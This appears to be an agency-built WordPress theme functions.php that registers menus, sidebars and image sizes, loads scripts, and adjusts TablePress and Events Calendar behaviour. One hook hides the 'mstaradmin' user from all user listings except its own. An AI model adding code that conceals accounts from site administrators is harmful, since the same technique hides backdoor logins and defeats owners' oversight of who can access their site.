<?php 
defined('ABSPATH') OR exit;
/**
 * @package WordPress
 * @subpackage WP-Skeleton
 */
define( 'THEME_VERSION', '1.0.0' );

// drag and drop menu support
//unregister_nav_menu( $location ); <-- registered menus be unregistered (load theme once) if eliminating
register_nav_menu( 'primary', 'Primary Menu' );
register_nav_menu( 'topnav', 'Top Nav' );
register_nav_menu( 'footer-left', 'Left Footer Nav' );
register_nav_menu( 'footer-right', 'Right Footer Nav' );
register_nav_menu( 'staff-portal', 'Staff Portal Nav' );
register_nav_menu( 'student-portal', 'Student Portal Nav' );
register_nav_menu( 'resource-nav', 'Resource Nav' );

//widget support for a right sidebar
register_sidebar(array(
  'name' => 'Right SideBar',
  'id' => 'right-sidebar',
  'description' => 'Widgets in this area will be shown on the right-hand side.',
  'before_widget' => '<div id="%1$s">',
  'after_widget'  => '</div>',  
  'before_title' => '<h3>',
  'after_title' => '</h3>'
));

//widget support for the footer
register_sidebar(array(
  'name' => 'Footer SideBar',
  'id' => 'footer-sidebar',
  'description' => 'Widgets in this area will be shown in the footer.',
  'before_widget' => '<div id="%1$s">',
  'after_widget'  => '</div>',
  'before_title' => '<h3>',
  'after_title' => '</h3>'
));

//This theme uses post thumbnails
add_theme_support( 'post-thumbnails' );
add_image_size( 'featured-image', 300, 350, true);
add_image_size( 'video-thumb', 300, 185, true);
add_image_size( 'video-sm-thumb', 150, 93, true);
add_image_size( 'story-thumb', 365, 276, true);
add_image_size( 'blog-thumb', 500, 500, true);
add_image_size( 'small-thumb', 100, 100, true);
add_image_size( 'landing-page-img', 830, 400, true);


//Apply do_shortcode() to widgets so that shortcodes will be executed in widgets
add_filter('widget_text', 'do_shortcode');


//Hide MStar as a user
add_action('pre_user_query','mstar_pre_user_query');
function mstar_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	
	if ($username != 'mstaradmin') { 
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'mstaradmin'",$user_search->query_where);
	}
}

//Force WordPress to load JS asyncronously
function mstar_async_scripts($url) {
	if (strpos($url, '#asyncload') === false){
		return $url;
	} else if ( is_admin() ) {
		return str_replace('#asyncload', '', $url);
	} else {
		return str_replace('#asyncload', '', $url) . "' async='async";
	}
}
add_filter( 'clean_url', 'mstar_async_scripts', 11, 1 );

//Add jquery Library
if (!is_admin()) add_action("wp_enqueue_scripts", "mstar_jquery_enqueue", 11);
function mstar_jquery_enqueue() {
	wp_deregister_script('jquery');
	wp_register_script('jquery', "http" . ($_SERVER['SERVER_PORT'] == 443 ? "s" : "") . "://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js", false, null);
	wp_enqueue_script('detect', get_template_directory_uri().'/includes/js/mobile-detect.js#asyncload', array( 'jquery' ) );
	wp_enqueue_script('jquery');
	wp_enqueue_script('navigation', get_template_directory_uri().'/includes/js/navigation.js', array(), '1.0.0', true );
	wp_enqueue_script('customjs', get_template_directory_uri().'/includes/js/custom.js', array('jquery'), '1.0.0', true );
}


//Adds Customizer functinality
function mytheme_customize_register( $wp_customize ){
	require_once( get_stylesheet_directory() . '/includes/customizer.php' );
}
add_action( 'customize_register', 'mytheme_customize_register' );



add_theme_support( 'admin-bar', array( 'callback' => '__return_false' ) );


include('includes/custom_login_functions.php');
include('includes/general_functions.php');
include('includes/tinymce_functions.php');
include('includes/excerpt_functions.php');
include('includes/tracker_functions.php');
include('includes/upload_functions.php');
include('includes/form_functions.php');
include('includes/cpt_functions.php'); 	//-- use for custom post types
include('includes/menus.php');
include('includes/acf.php');


/**
 * Add scope attributes to table headers
 *
 * @param  mixed $output HTML output of the table.
 * @param  mixed $table Table object.
 * @param  array $render_options Render options.
 * @return string HTML output of the table.
 */
function tablepress_add_scope( $output, $table, $render_options ) {
	$dom = new DOMDocument();
	$dom->loadHTML( $output );
	$xpath = new DOMXPath( $dom );
	if ( $render_options['table_head'] ) {
		$th = $xpath->query( '//thead/tr/th' );
		foreach ( $th as $node ) {
			$node->setAttribute( 'scope', 'col' );
		}
	}
	if ( $render_options['first_column_th'] ) {
		$th = $xpath->query( '//tbody/tr/th' );
		foreach ( $th as $node ) {
			$node->setAttribute( 'scope', 'row' );
		}
	}
	$output = $dom->saveHTML();
	return $output;
}
add_filter( 'tablepress_table_output', 'tablepress_add_scope', 10, 3 );

/**
 * Inject the list of categories after the title.
 *
 * @return void
 */
function categories_after_title() {
	global $post;
	?>
	<ul class='tribe-event-categories'>
		<?php echo tribe_get_event_taxonomy( $post->ID ); ?>
	</ul>
	<?php
}
add_action( 'tribe_template_before_include:events/v2/list/event/venue', 'categories_after_title' );

/**
 * The Events Calendar: Remove the Organizers post type from Events.
 *
 * Replace instances of ORGANIZER_POST_TYPE with VENUE_POST_TYPE if you
 * want to do so for Venues instead.
 *
 * @link https://theeventscalendar.com/knowledgebase/linked-post-types/
 * @link https://gist.github.com/a521d02facbc64ce3891c9341384cc07
 */
function tribe_remove_organizers_from_events( $default_types ) {
 
    if (
        ! is_array( $default_types )
        || empty( $default_types )
        || empty( Tribe__Events__Main::ORGANIZER_POST_TYPE )
    ) {
        return $default_types;
    }
 
    if ( ( $key = array_search( Tribe__Events__Main::ORGANIZER_POST_TYPE, $default_types ) ) !== false ) {
        unset( $default_types[ $key ] );
    }
 
    return $default_types;
}
 
add_filter( 'tribe_events_register_default_linked_post_types', 'tribe_remove_organizers_from_events' );

function unregister_tribe_organizer_post_type() {
	unregister_post_type( 'tribe_organizer' );
}
add_action( 'init', 'unregister_tribe_organizer_post_type', 20 );

add_action( 'admin_menu', 'remove_my_submenu', 9999 );
function remove_my_submenu() {
	remove_submenu_page('edit.php?post_type=tribe_events', 'edit.php?post_type=' . Tribe__Events__Organizer::POSTTYPE );
}
